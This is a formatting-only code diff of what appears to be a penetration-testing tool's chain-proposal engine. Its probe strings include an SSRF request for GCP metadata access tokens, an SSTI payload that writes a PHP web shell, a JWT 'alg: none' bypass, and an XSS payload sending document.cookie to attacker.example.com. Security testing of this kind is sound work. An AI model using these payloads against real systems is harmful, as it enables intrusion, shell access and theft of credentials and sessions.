@@ -150,10 +150,7 @@ class ChainProposalEngine:
                 "access token in the response is a critical finding."
             ),
             target_hint="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-            probe=(
-                "GET {target} HTTP/1.1\\r\\n"
-                "Metadata-Flavor: Google\\r\\n\\r\\n"
-            ),
+            probe=("GET {target} HTTP/1.1\\r\\nMetadata-Flavor: Google\\r\\n\\r\\n"),
             expected_finding="ssrf-gcp-metadata",
             confidence=0.75,
         )
@@ -178,7 +175,11 @@ class ChainProposalEngine:
 
     @staticmethod
     def _chain_ssti_to_rce(f: FindingShape) -> ChainProposal | None:
-        if f.category.lower() not in {"ssti", "template_injection", "server_side_template_injection"}:
+        if f.category.lower() not in {
+            "ssti",
+            "template_injection",
+            "server_side_template_injection",
+        }:
             return None
         if "writable" in (f.evidence.get("context") or "").lower():
             return None
@@ -193,7 +194,7 @@ class ChainProposalEngine:
             target_hint=f.url,
             probe=(
                 "POST {target} with body containing "
-                "'{{ self.__init__.__globals__.__builtins__.open(\"//var//www//shell.php\",\"w\").write(\"<?php system($_GET[c]); ?>\") }}'"
+                '\'{{ self.__init__.__globals__.__builtins__.open("//var//www//shell.php","w").write("<?php system($_GET[c]); ?>") }}\''
             ),
             expected_finding="rce-webshell",
             confidence=0.6,
@@ -254,8 +255,7 @@ class ChainProposalEngine:
             ),
             target_hint=f.url,
             probe=(
-                "POST {target} with the JWT header swapped to "
-                "'alg: none' and an empty signature."
+                "POST {target} with the JWT header swapped to 'alg: none' and an empty signature."
             ),
             expected_finding="jwt-alg-none",
             confidence=0.65,
@@ -276,7 +276,7 @@ class ChainProposalEngine:
             target_hint=f.url,
             probe=(
                 "POST {target} with body "
-                "'<img src=x onerror=\"fetch(\\\"//attacker.example.com/?c=\\\"+document.cookie)\">'"
+                '\'<img src=x onerror="fetch(\\"//attacker.example.com/?c=\\"+document.cookie)">\''
             ),
             expected_finding="session-hijack",
             confidence=0.5,
